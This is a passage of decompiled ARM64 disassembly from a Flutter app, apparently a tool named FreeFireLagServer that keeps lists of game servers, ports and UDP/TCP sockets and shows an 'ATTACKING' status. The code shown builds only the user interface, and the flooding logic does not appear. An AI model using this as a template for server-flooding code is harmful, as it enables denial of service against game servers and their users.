// lib: , url: package:darkverse/FreeFireLagServer.dart

// class id: 1048728, size: 0x8
class :: {
}

// class id: 3717, size: 0xc, field offset: 0xc
//   const constructor, 
class FreeFireLagServerPage extends StatefulWidget {

  _ createState(/* No info */) {
    // ** addr: 0x9df008, size: 0x24
    // 0x9df008: EnterFrame
    //     0x9df008: stp             fp, lr, [SP, #-0x10]!
    //     0x9df00c: mov             fp, SP
    // 0x9df010: mov             x0, x1
    // 0x9df014: r1 = <FreeFireLagServerPage>
    //     0x9df014: add             x1, PP, #0x33, lsl #12  ; [pp+0x33010] TypeArguments: <FreeFireLagServerPage>
    //     0x9df018: ldr             x1, [x1, #0x10]
    // 0x9df01c: r0 = _FreeFireLagServerPageState()
    //     0x9df01c: bl              #0x9df02c  ; Allocate_FreeFireLagServerPageStateStub -> _FreeFireLagServerPageState (size=0x14)
    // 0x9df020: LeaveFrame
    //     0x9df020: mov             SP, fp
    //     0x9df024: ldp             fp, lr, [SP], #0x10
    // 0x9df028: ret
    //     0x9df028: ret             
  }
}

// class id: 4115, size: 0x14, field offset: 0x14
class _FreeFireLagServerPageState extends State<dynamic> {

  static late final List<String> freefireServers; // offset: 0xd84
  static late List<Timer> _timers; // offset: 0xd74
  static late List<HttpClient> _httpClients; // offset: 0xd78
  static late List<RawDatagramSocket> _udpSockets; // offset: 0xd7c
  static late List<Socket> _tcpSockets; // offset: 0xd80
  static late final List<int> ports; // offset: 0xd88

  _ build(/* No info */) {
    // ** addr: 0x876058, size: 0x174
    // 0x876058: EnterFrame
    //     0x876058: stp             fp, lr, [SP, #-0x10]!
    //     0x87605c: mov             fp, SP
    // 0x876060: AllocStack(0x40)
    //     0x876060: sub             SP, SP, #0x40
    // 0x876064: SetupParameters(_FreeFireLagServerPageState this /* r1 => r1, fp-0x8 */, dynamic _ /* r2 => r2, fp-0x10 */)
    //     0x876064: stur            x1, [fp, #-8]
    //     0x876068: stur            x2, [fp, #-0x10]
    // 0x87606c: CheckStackOverflow
    //     0x87606c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x876070: cmp             SP, x16
    //     0x876074: b.ls            #0x8761c4
    // 0x876078: r1 = 2
    //     0x876078: mov             x1, #2
    // 0x87607c: r0 = AllocateContext()
    //     0x87607c: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x876080: mov             x1, x0
    // 0x876084: ldur            x0, [fp, #-8]
    // 0x876088: stur            x1, [fp, #-0x18]
    // 0x87608c: StoreField: r1->field_f = r0
    //     0x87608c: stur            w0, [x1, #0xf]
    // 0x876090: ldur            x0, [fp, #-0x10]
    // 0x876094: StoreField: r1->field_13 = r0
    //     0x876094: stur            w0, [x1, #0x13]
    // 0x876098: r16 = <ThemeProvider>
    //     0x876098: ldr             x16, [PP, #0x6dd8]  ; [pp+0x6dd8] TypeArguments: <ThemeProvider>
    // 0x87609c: stp             x0, x16, [SP]
    // 0x8760a0: r4 = const [0x1, 0x1, 0x1, 0x1, null]
    //     0x8760a0: ldr             x4, [PP, #0xde8]  ; [pp+0xde8] List(5) [0x1, 0x1, 0x1, 0x1, Null]
    // 0x8760a4: r0 = of()
    //     0x8760a4: bl              #0x6a7cb0  ; [package:provider/src/provider.dart] Provider::of
    // 0x8760a8: ldur            x2, [fp, #-0x18]
    // 0x8760ac: r1 = Function '<anonymous closure>':.
    //     0x8760ac: add             x1, PP, #0x3b, lsl #12  ; [pp+0x3bd40] AnonymousClosure: (0x832254), in [package:darkverse/owner_page.dart] _OwnerPageState::build (0x8c8e5c)
    //     0x8760b0: ldr             x1, [x1, #0xd40]
    // 0x8760b4: r0 = AllocateClosure()
    //     0x8760b4: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x8760b8: stur            x0, [fp, #-8]
    // 0x8760bc: r0 = IconButton()
    //     0x8760bc: bl              #0x6cb53c  ; AllocateIconButtonStub -> IconButton (size=0x74)
    // 0x8760c0: mov             x1, x0
    // 0x8760c4: ldur            x0, [fp, #-8]
    // 0x8760c8: stur            x1, [fp, #-0x10]
    // 0x8760cc: StoreField: r1->field_3b = r0
    //     0x8760cc: stur            w0, [x1, #0x3b]
    // 0x8760d0: r0 = false
    //     0x8760d0: add             x0, NULL, #0x30  ; false
    // 0x8760d4: StoreField: r1->field_4f = r0
    //     0x8760d4: stur            w0, [x1, #0x4f]
    // 0x8760d8: r2 = Instance_Icon
    //     0x8760d8: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3b0c0] Obj!Icon@a36821
    //     0x8760dc: ldr             x2, [x2, #0xc0]
    // 0x8760e0: StoreField: r1->field_1f = r2
    //     0x8760e0: stur            w2, [x1, #0x1f]
    // 0x8760e4: r2 = Instance__IconButtonVariant
    //     0x8760e4: add             x2, PP, #0x13, lsl #12  ; [pp+0x13ec8] Obj!_IconButtonVariant@a41521
    //     0x8760e8: ldr             x2, [x2, #0xec8]
    // 0x8760ec: StoreField: r1->field_6f = r2
    //     0x8760ec: stur            w2, [x1, #0x6f]
    // 0x8760f0: r0 = AppBar()
    //     0x8760f0: bl              #0x5fadf4  ; AllocateAppBarStub -> AppBar (size=0x98)
    // 0x8760f4: stur            x0, [fp, #-8]
    // 0x8760f8: r16 = Instance_Text
    //     0x8760f8: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3bd48] Obj!Text@a30371
    //     0x8760fc: ldr             x16, [x16, #0xd48]
    // 0x876100: r30 = Instance_Color
    //     0x876100: add             lr, PP, #0xb, lsl #12  ; [pp+0xbdc0] Obj!Color@a0e491
    //     0x876104: ldr             lr, [lr, #0xdc0]
    // 0x876108: stp             lr, x16, [SP, #0x18]
    // 0x87610c: r16 = true
    //     0x87610c: add             x16, NULL, #0x20  ; true
    // 0x876110: r30 = 0.000000
    //     0x876110: ldr             lr, [PP, #0x4910]  ; [pp+0x4910] 0
    // 0x876114: stp             lr, x16, [SP, #8]
    // 0x876118: ldur            x16, [fp, #-0x10]
    // 0x87611c: str             x16, [SP]
    // 0x876120: mov             x1, x0
    // 0x876124: r4 = const [0, 0x6, 0x5, 0x1, backgroundColor, 0x2, centerTitle, 0x3, elevation, 0x4, leading, 0x5, title, 0x1, null]
    //     0x876124: add             x4, PP, #0x3b, lsl #12  ; [pp+0x3bd50] List(15) [0, 0x6, 0x5, 0x1, "backgroundColor", 0x2, "centerTitle", 0x3, "elevation", 0x4, "leading", 0x5, "title", 0x1, Null]
    //     0x876128: ldr             x4, [x4, #0xd50]
    // 0x87612c: r0 = AppBar()
    //     0x87612c: bl              #0x5fa308  ; [package:flutter/src/material/app_bar.dart] AppBar::AppBar
    // 0x876130: ldur            x2, [fp, #-0x18]
    // 0x876134: r1 = Function '<anonymous closure>':.
    //     0x876134: add             x1, PP, #0x3b, lsl #12  ; [pp+0x3bd58] AnonymousClosure: (0x8761cc), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::build (0x876058)
    //     0x876138: ldr             x1, [x1, #0xd58]
    // 0x87613c: r0 = AllocateClosure()
    //     0x87613c: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x876140: stur            x0, [fp, #-0x10]
    // 0x876144: r0 = StatefulBuilder()
    //     0x876144: bl              #0x6e556c  ; AllocateStatefulBuilderStub -> StatefulBuilder (size=0x10)
    // 0x876148: mov             x1, x0
    // 0x87614c: ldur            x0, [fp, #-0x10]
    // 0x876150: stur            x1, [fp, #-0x18]
    // 0x876154: StoreField: r1->field_b = r0
    //     0x876154: stur            w0, [x1, #0xb]
    // 0x876158: r0 = Scaffold()
    //     0x876158: bl              #0x6945f0  ; AllocateScaffoldStub -> Scaffold (size=0x78)
    // 0x87615c: ldur            x1, [fp, #-8]
    // 0x876160: ArrayStore: r0[0] = r1  ; List_4
    //     0x876160: stur            w1, [x0, #0x17]
    // 0x876164: ldur            x1, [fp, #-0x18]
    // 0x876168: StoreField: r0->field_1b = r1
    //     0x876168: stur            w1, [x0, #0x1b]
    // 0x87616c: r1 = Instance_AlignmentDirectional
    //     0x87616c: add             x1, PP, #0xd, lsl #12  ; [pp+0xd168] Obj!AlignmentDirectional@a09c31
    //     0x876170: ldr             x1, [x1, #0x168]
    // 0x876174: StoreField: r0->field_2f = r1
    //     0x876174: stur            w1, [x0, #0x2f]
    // 0x876178: r1 = Instance_Color
    //     0x876178: add             x1, PP, #0xb, lsl #12  ; [pp+0xbdc0] Obj!Color@a0e491
    //     0x87617c: ldr             x1, [x1, #0xdc0]
    // 0x876180: StoreField: r0->field_4f = r1
    //     0x876180: stur            w1, [x0, #0x4f]
    // 0x876184: r1 = true
    //     0x876184: add             x1, NULL, #0x20  ; true
    // 0x876188: StoreField: r0->field_5f = r1
    //     0x876188: stur            w1, [x0, #0x5f]
    // 0x87618c: r2 = Instance_DragStartBehavior
    //     0x87618c: ldr             x2, [PP, #0x5090]  ; [pp+0x5090] Obj!DragStartBehavior@a418a1
    // 0x876190: StoreField: r0->field_63 = r2
    //     0x876190: stur            w2, [x0, #0x63]
    // 0x876194: r2 = false
    //     0x876194: add             x2, NULL, #0x30  ; false
    // 0x876198: StoreField: r0->field_b = r2
    //     0x876198: stur            w2, [x0, #0xb]
    // 0x87619c: StoreField: r0->field_f = r1
    //     0x87619c: stur            w1, [x0, #0xf]
    // 0x8761a0: StoreField: r0->field_13 = r2
    //     0x8761a0: stur            w2, [x0, #0x13]
    // 0x8761a4: r2 = Closure: (BuildContext, Animation<double>) => Widget from Function '_defaultBottomSheetScrimBuilder@89420462': static.
    //     0x8761a4: add             x2, PP, #0xd, lsl #12  ; [pp+0xd170] Closure: (BuildContext, Animation<double>) => Widget from Function '_defaultBottomSheetScrimBuilder@89420462': static. (0x75b335bba4)
    //     0x8761a8: ldr             x2, [x2, #0x170]
    // 0x8761ac: StoreField: r0->field_4b = r2
    //     0x8761ac: stur            w2, [x0, #0x4b]
    // 0x8761b0: StoreField: r0->field_6b = r1
    //     0x8761b0: stur            w1, [x0, #0x6b]
    // 0x8761b4: StoreField: r0->field_6f = r1
    //     0x8761b4: stur            w1, [x0, #0x6f]
    // 0x8761b8: LeaveFrame
    //     0x8761b8: mov             SP, fp
    //     0x8761bc: ldp             fp, lr, [SP], #0x10
    // 0x8761c0: ret
    //     0x8761c0: ret             
    // 0x8761c4: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x8761c4: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x8761c8: b               #0x876078
  }
  [closure] SingleChildScrollView <anonymous closure>(dynamic, BuildContext, (dynamic, (dynamic) => void) => void) {
    // ** addr: 0x8761cc, size: 0x16fc
    // 0x8761cc: EnterFrame
    //     0x8761cc: stp             fp, lr, [SP, #-0x10]!
    //     0x8761d0: mov             fp, SP
    // 0x8761d4: AllocStack(0x90)
    //     0x8761d4: sub             SP, SP, #0x90
    // 0x8761d8: SetupParameters([dynamic _ /* r0 */])
    //     0x8761d8: ldr             x0, [fp, #0x20]
    //     0x8761dc: ldur            w1, [x0, #0x17]
    //     0x8761e0: add             x1, x1, HEAP, lsl #32
    //     0x8761e4: stur            x1, [fp, #-8]
    // 0x8761e8: CheckStackOverflow
    //     0x8761e8: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x8761ec: cmp             SP, x16
    //     0x8761f0: b.ls            #0x877868
    // 0x8761f4: r1 = 2
    //     0x8761f4: mov             x1, #2
    // 0x8761f8: r0 = AllocateContext()
    //     0x8761f8: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x8761fc: mov             x1, x0
    // 0x876200: ldur            x0, [fp, #-8]
    // 0x876204: stur            x1, [fp, #-0x10]
    // 0x876208: StoreField: r1->field_b = r0
    //     0x876208: stur            w0, [x1, #0xb]
    // 0x87620c: ldr             x2, [fp, #0x18]
    // 0x876210: StoreField: r1->field_f = r2
    //     0x876210: stur            w2, [x1, #0xf]
    // 0x876214: ldr             x2, [fp, #0x10]
    // 0x876218: StoreField: r1->field_13 = r2
    //     0x876218: stur            w2, [x1, #0x13]
    // 0x87621c: r0 = Radius()
    //     0x87621c: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x876220: d0 = 20.000000
    //     0x876220: fmov            d0, #20.00000000
    // 0x876224: stur            x0, [fp, #-0x18]
    // 0x876228: StoreField: r0->field_7 = d0
    //     0x876228: stur            d0, [x0, #7]
    // 0x87622c: StoreField: r0->field_f = d0
    //     0x87622c: stur            d0, [x0, #0xf]
    // 0x876230: r0 = BorderRadius()
    //     0x876230: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x876234: mov             x1, x0
    // 0x876238: ldur            x0, [fp, #-0x18]
    // 0x87623c: stur            x1, [fp, #-0x20]
    // 0x876240: StoreField: r1->field_7 = r0
    //     0x876240: stur            w0, [x1, #7]
    // 0x876244: StoreField: r1->field_b = r0
    //     0x876244: stur            w0, [x1, #0xb]
    // 0x876248: StoreField: r1->field_f = r0
    //     0x876248: stur            w0, [x1, #0xf]
    // 0x87624c: StoreField: r1->field_13 = r0
    //     0x87624c: stur            w0, [x1, #0x13]
    // 0x876250: r0 = BoxDecoration()
    //     0x876250: bl              #0x63648c  ; AllocateBoxDecorationStub -> BoxDecoration (size=0x28)
    // 0x876254: mov             x1, x0
    // 0x876258: ldur            x0, [fp, #-0x20]
    // 0x87625c: stur            x1, [fp, #-0x18]
    // 0x876260: StoreField: r1->field_13 = r0
    //     0x876260: stur            w0, [x1, #0x13]
    // 0x876264: r0 = Instance_LinearGradient
    //     0x876264: add             x0, PP, #0x3b, lsl #12  ; [pp+0x3bd60] Obj!LinearGradient@a05901
    //     0x876268: ldr             x0, [x0, #0xd60]
    // 0x87626c: StoreField: r1->field_1b = r0
    //     0x87626c: stur            w0, [x1, #0x1b]
    // 0x876270: r0 = Instance_BoxShape
    //     0x876270: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd78] Obj!BoxShape@a406a1
    //     0x876274: ldr             x0, [x0, #0xd78]
    // 0x876278: StoreField: r1->field_23 = r0
    //     0x876278: stur            w0, [x1, #0x23]
    // 0x87627c: r0 = Container()
    //     0x87627c: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x876280: stur            x0, [fp, #-0x20]
    // 0x876284: r16 = Instance_EdgeInsets
    //     0x876284: ldr             x16, [PP, #0x5348]  ; [pp+0x5348] Obj!EdgeInsets@a05fc1
    // 0x876288: ldur            lr, [fp, #-0x18]
    // 0x87628c: stp             lr, x16, [SP, #8]
    // 0x876290: r16 = Instance_Column
    //     0x876290: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3bd68] Obj!Column@a3bde1
    //     0x876294: ldr             x16, [x16, #0xd68]
    // 0x876298: str             x16, [SP]
    // 0x87629c: mov             x1, x0
    // 0x8762a0: r4 = const [0, 0x4, 0x3, 0x1, child, 0x3, decoration, 0x2, padding, 0x1, null]
    //     0x8762a0: add             x4, PP, #0x11, lsl #12  ; [pp+0x11e58] List(11) [0, 0x4, 0x3, 0x1, "child", 0x3, "decoration", 0x2, "padding", 0x1, Null]
    //     0x8762a4: ldr             x4, [x4, #0xe58]
    // 0x8762a8: r0 = Container()
    //     0x8762a8: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x8762ac: r0 = Color()
    //     0x8762ac: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x8762b0: mov             x1, x0
    // 0x8762b4: r0 = Instance_ColorSpace
    //     0x8762b4: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x8762b8: stur            x1, [fp, #-0x18]
    // 0x8762bc: StoreField: r1->field_27 = r0
    //     0x8762bc: stur            w0, [x1, #0x27]
    // 0x8762c0: d0 = 0.101961
    //     0x8762c0: ldr             d0, [PP, #0x6f30]  ; [pp+0x6f30] IMM: double(0.10196078431372549) from 0x3fba1a1a1a1a1a1a
    // 0x8762c4: StoreField: r1->field_7 = d0
    //     0x8762c4: stur            d0, [x1, #7]
    // 0x8762c8: d1 = 0.992157
    //     0x8762c8: ldr             d1, [PP, #0x6f38]  ; [pp+0x6f38] IMM: double(0.9921568627450981) from 0x3fefbfbfbfbfbfc0
    // 0x8762cc: StoreField: r1->field_f = d1
    //     0x8762cc: stur            d1, [x1, #0xf]
    // 0x8762d0: d2 = 0.619608
    //     0x8762d0: ldr             d2, [PP, #0x6f40]  ; [pp+0x6f40] IMM: double(0.6196078431372549) from 0x3fe3d3d3d3d3d3d4
    // 0x8762d4: ArrayStore: r1[0] = d2  ; List_8
    //     0x8762d4: stur            d2, [x1, #0x17]
    // 0x8762d8: StoreField: r1->field_1f = d2
    //     0x8762d8: stur            d2, [x1, #0x1f]
    // 0x8762dc: r0 = Radius()
    //     0x8762dc: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x8762e0: d0 = 15.000000
    //     0x8762e0: fmov            d0, #15.00000000
    // 0x8762e4: stur            x0, [fp, #-0x28]
    // 0x8762e8: StoreField: r0->field_7 = d0
    //     0x8762e8: stur            d0, [x0, #7]
    // 0x8762ec: StoreField: r0->field_f = d0
    //     0x8762ec: stur            d0, [x0, #0xf]
    // 0x8762f0: r0 = BorderRadius()
    //     0x8762f0: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x8762f4: mov             x1, x0
    // 0x8762f8: ldur            x0, [fp, #-0x28]
    // 0x8762fc: stur            x1, [fp, #-0x30]
    // 0x876300: StoreField: r1->field_7 = r0
    //     0x876300: stur            w0, [x1, #7]
    // 0x876304: StoreField: r1->field_b = r0
    //     0x876304: stur            w0, [x1, #0xb]
    // 0x876308: StoreField: r1->field_f = r0
    //     0x876308: stur            w0, [x1, #0xf]
    // 0x87630c: StoreField: r1->field_13 = r0
    //     0x87630c: stur            w0, [x1, #0x13]
    // 0x876310: r0 = Color()
    //     0x876310: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x876314: mov             x1, x0
    // 0x876318: r0 = Instance_ColorSpace
    //     0x876318: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x87631c: StoreField: r1->field_27 = r0
    //     0x87631c: stur            w0, [x1, #0x27]
    // 0x876320: d1 = 0.760784
    //     0x876320: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x876324: ldr             d1, [x17, #0xc40]
    // 0x876328: StoreField: r1->field_7 = d1
    //     0x876328: stur            d1, [x1, #7]
    // 0x87632c: d2 = 0.956863
    //     0x87632c: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x876330: ldr             d2, [x17, #0xec8]
    // 0x876334: StoreField: r1->field_f = d2
    //     0x876334: stur            d2, [x1, #0xf]
    // 0x876338: ArrayStore: r1[0] = d2  ; List_8
    //     0x876338: stur            d2, [x1, #0x17]
    // 0x87633c: StoreField: r1->field_1f = d2
    //     0x87633c: stur            d2, [x1, #0x1f]
    // 0x876340: d0 = 0.300000
    //     0x876340: add             x17, PP, #0xd, lsl #12  ; [pp+0xd180] IMM: double(0.3) from 0x3fd3333333333333
    //     0x876344: ldr             d0, [x17, #0x180]
    // 0x876348: r0 = withOpacity()
    //     0x876348: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x87634c: str             x0, [SP]
    // 0x876350: r1 = Null
    //     0x876350: mov             x1, NULL
    // 0x876354: r4 = const [0, 0x2, 0x1, 0x1, color, 0x1, null]
    //     0x876354: add             x4, PP, #0xb, lsl #12  ; [pp+0xbc68] List(7) [0, 0x2, 0x1, 0x1, "color", 0x1, Null]
    //     0x876358: ldr             x4, [x4, #0xc68]
    // 0x87635c: r0 = Border.all()
    //     0x87635c: bl              #0x6b0744  ; [package:flutter/src/painting/box_border.dart] Border::Border.all
    // 0x876360: stur            x0, [fp, #-0x28]
    // 0x876364: r0 = BoxDecoration()
    //     0x876364: bl              #0x63648c  ; AllocateBoxDecorationStub -> BoxDecoration (size=0x28)
    // 0x876368: mov             x1, x0
    // 0x87636c: ldur            x0, [fp, #-0x18]
    // 0x876370: stur            x1, [fp, #-0x38]
    // 0x876374: StoreField: r1->field_7 = r0
    //     0x876374: stur            w0, [x1, #7]
    // 0x876378: ldur            x0, [fp, #-0x28]
    // 0x87637c: StoreField: r1->field_f = r0
    //     0x87637c: stur            w0, [x1, #0xf]
    // 0x876380: ldur            x0, [fp, #-0x30]
    // 0x876384: StoreField: r1->field_13 = r0
    //     0x876384: stur            w0, [x1, #0x13]
    // 0x876388: r0 = Instance_BoxShape
    //     0x876388: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd78] Obj!BoxShape@a406a1
    //     0x87638c: ldr             x0, [x0, #0xd78]
    // 0x876390: StoreField: r1->field_23 = r0
    //     0x876390: stur            w0, [x1, #0x23]
    // 0x876394: r2 = LoadStaticField(0xd6c)
    //     0x876394: ldr             x2, [THR, #0x78]  ; THR::field_table_values
    //     0x876398: ldr             x2, [x2, #0x1ad8]
    // 0x87639c: stur            x2, [fp, #-0x18]
    // 0x8763a0: tbnz            w2, #4, #0x8763dc
    // 0x8763a4: r0 = Color()
    //     0x8763a4: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x8763a8: mov             x1, x0
    // 0x8763ac: r0 = Instance_ColorSpace
    //     0x8763ac: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x8763b0: StoreField: r1->field_27 = r0
    //     0x8763b0: stur            w0, [x1, #0x27]
    // 0x8763b4: d0 = 0.760784
    //     0x8763b4: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x8763b8: ldr             d0, [x17, #0xc40]
    // 0x8763bc: StoreField: r1->field_7 = d0
    //     0x8763bc: stur            d0, [x1, #7]
    // 0x8763c0: d1 = 0.956863
    //     0x8763c0: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x8763c4: ldr             d1, [x17, #0xec8]
    // 0x8763c8: StoreField: r1->field_f = d1
    //     0x8763c8: stur            d1, [x1, #0xf]
    // 0x8763cc: ArrayStore: r1[0] = d1  ; List_8
    //     0x8763cc: stur            d1, [x1, #0x17]
    // 0x8763d0: StoreField: r1->field_1f = d1
    //     0x8763d0: stur            d1, [x1, #0x1f]
    // 0x8763d4: mov             x2, x1
    // 0x8763d8: b               #0x876424
    // 0x8763dc: d0 = 0.760784
    //     0x8763dc: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x8763e0: ldr             d0, [x17, #0xc40]
    // 0x8763e4: r0 = Instance_ColorSpace
    //     0x8763e4: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x8763e8: d1 = 0.956863
    //     0x8763e8: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x8763ec: ldr             d1, [x17, #0xec8]
    // 0x8763f0: r0 = Color()
    //     0x8763f0: bl              #0x4de1ac  ; AllocateColorStub -> Color (size=0x2c)
    // 0x8763f4: mov             x1, x0
    // 0x8763f8: r0 = Instance_ColorSpace
    //     0x8763f8: ldr             x0, [PP, #0x6e40]  ; [pp+0x6e40] Obj!ColorSpace@a43d01
    // 0x8763fc: StoreField: r1->field_27 = r0
    //     0x8763fc: stur            w0, [x1, #0x27]
    // 0x876400: d0 = 0.760784
    //     0x876400: add             x17, PP, #0x13, lsl #12  ; [pp+0x13c40] IMM: double(0.7607843137254902) from 0x3fe8585858585858
    //     0x876404: ldr             d0, [x17, #0xc40]
    // 0x876408: StoreField: r1->field_7 = d0
    //     0x876408: stur            d0, [x1, #7]
    // 0x87640c: d1 = 0.956863
    //     0x87640c: add             x17, PP, #0xc, lsl #12  ; [pp+0xcec8] IMM: double(0.9568627450980393) from 0x3fee9e9e9e9e9e9f
    //     0x876410: ldr             d1, [x17, #0xec8]
    // 0x876414: StoreField: r1->field_f = d1
    //     0x876414: stur            d1, [x1, #0xf]
    // 0x876418: ArrayStore: r1[0] = d1  ; List_8
    //     0x876418: stur            d1, [x1, #0x17]
    // 0x87641c: StoreField: r1->field_1f = d1
    //     0x87641c: stur            d1, [x1, #0x1f]
    // 0x876420: mov             x2, x1
    // 0x876424: ldur            x1, [fp, #-0x18]
    // 0x876428: stur            x2, [fp, #-0x28]
    // 0x87642c: r0 = Radius()
    //     0x87642c: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x876430: d0 = 20.000000
    //     0x876430: fmov            d0, #20.00000000
    // 0x876434: stur            x0, [fp, #-0x30]
    // 0x876438: StoreField: r0->field_7 = d0
    //     0x876438: stur            d0, [x0, #7]
    // 0x87643c: StoreField: r0->field_f = d0
    //     0x87643c: stur            d0, [x0, #0xf]
    // 0x876440: r0 = BorderRadius()
    //     0x876440: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x876444: mov             x1, x0
    // 0x876448: ldur            x0, [fp, #-0x30]
    // 0x87644c: stur            x1, [fp, #-0x40]
    // 0x876450: StoreField: r1->field_7 = r0
    //     0x876450: stur            w0, [x1, #7]
    // 0x876454: StoreField: r1->field_b = r0
    //     0x876454: stur            w0, [x1, #0xb]
    // 0x876458: StoreField: r1->field_f = r0
    //     0x876458: stur            w0, [x1, #0xf]
    // 0x87645c: StoreField: r1->field_13 = r0
    //     0x87645c: stur            w0, [x1, #0x13]
    // 0x876460: r0 = BoxDecoration()
    //     0x876460: bl              #0x63648c  ; AllocateBoxDecorationStub -> BoxDecoration (size=0x28)
    // 0x876464: mov             x1, x0
    // 0x876468: ldur            x0, [fp, #-0x28]
    // 0x87646c: stur            x1, [fp, #-0x30]
    // 0x876470: StoreField: r1->field_7 = r0
    //     0x876470: stur            w0, [x1, #7]
    // 0x876474: ldur            x0, [fp, #-0x40]
    // 0x876478: StoreField: r1->field_13 = r0
    //     0x876478: stur            w0, [x1, #0x13]
    // 0x87647c: r0 = Instance_BoxShape
    //     0x87647c: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd78] Obj!BoxShape@a406a1
    //     0x876480: ldr             x0, [x0, #0xd78]
    // 0x876484: StoreField: r1->field_23 = r0
    //     0x876484: stur            w0, [x1, #0x23]
    // 0x876488: ldur            x2, [fp, #-0x18]
    // 0x87648c: tbnz            w2, #4, #0x87649c
    // 0x876490: r3 = "ATTACKING"
    //     0x876490: add             x3, PP, #0x3b, lsl #12  ; [pp+0x3bd70] "ATTACKING"
    //     0x876494: ldr             x3, [x3, #0xd70]
    // 0x876498: b               #0x8764a4
    // 0x87649c: r3 = "IDLE"
    //     0x87649c: add             x3, PP, #0x3b, lsl #12  ; [pp+0x3bd78] "IDLE"
    //     0x8764a0: ldr             x3, [x3, #0xd78]
    // 0x8764a4: ldur            x2, [fp, #-8]
    // 0x8764a8: stur            x3, [fp, #-0x18]
    // 0x8764ac: r0 = Text()
    //     0x8764ac: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x8764b0: mov             x1, x0
    // 0x8764b4: ldur            x0, [fp, #-0x18]
    // 0x8764b8: stur            x1, [fp, #-0x28]
    // 0x8764bc: StoreField: r1->field_b = r0
    //     0x8764bc: stur            w0, [x1, #0xb]
    // 0x8764c0: r0 = Instance_TextStyle
    //     0x8764c0: add             x0, PP, #0x25, lsl #12  ; [pp+0x25ee0] Obj!TextStyle@a1c281
    //     0x8764c4: ldr             x0, [x0, #0xee0]
    // 0x8764c8: StoreField: r1->field_13 = r0
    //     0x8764c8: stur            w0, [x1, #0x13]
    // 0x8764cc: r0 = Container()
    //     0x8764cc: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x8764d0: stur            x0, [fp, #-0x18]
    // 0x8764d4: r16 = Instance_EdgeInsets
    //     0x8764d4: add             x16, PP, #0x24, lsl #12  ; [pp+0x244a0] Obj!EdgeInsets@a07fd1
    //     0x8764d8: ldr             x16, [x16, #0x4a0]
    // 0x8764dc: ldur            lr, [fp, #-0x30]
    // 0x8764e0: stp             lr, x16, [SP, #8]
    // 0x8764e4: ldur            x16, [fp, #-0x28]
    // 0x8764e8: str             x16, [SP]
    // 0x8764ec: mov             x1, x0
    // 0x8764f0: r4 = const [0, 0x4, 0x3, 0x1, child, 0x3, decoration, 0x2, padding, 0x1, null]
    //     0x8764f0: add             x4, PP, #0x11, lsl #12  ; [pp+0x11e58] List(11) [0, 0x4, 0x3, 0x1, "child", 0x3, "decoration", 0x2, "padding", 0x1, Null]
    //     0x8764f4: ldr             x4, [x4, #0xe58]
    // 0x8764f8: r0 = Container()
    //     0x8764f8: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x8764fc: r1 = Null
    //     0x8764fc: mov             x1, NULL
    // 0x876500: r2 = 4
    //     0x876500: mov             x2, #4
    // 0x876504: r0 = AllocateArray()
    //     0x876504: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x876508: stur            x0, [fp, #-0x28]
    // 0x87650c: r16 = Instance_Text
    //     0x87650c: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3bd80] Obj!Text@a30281
    //     0x876510: ldr             x16, [x16, #0xd80]
    // 0x876514: StoreField: r0->field_f = r16
    //     0x876514: stur            w16, [x0, #0xf]
    // 0x876518: ldur            x1, [fp, #-0x18]
    // 0x87651c: StoreField: r0->field_13 = r1
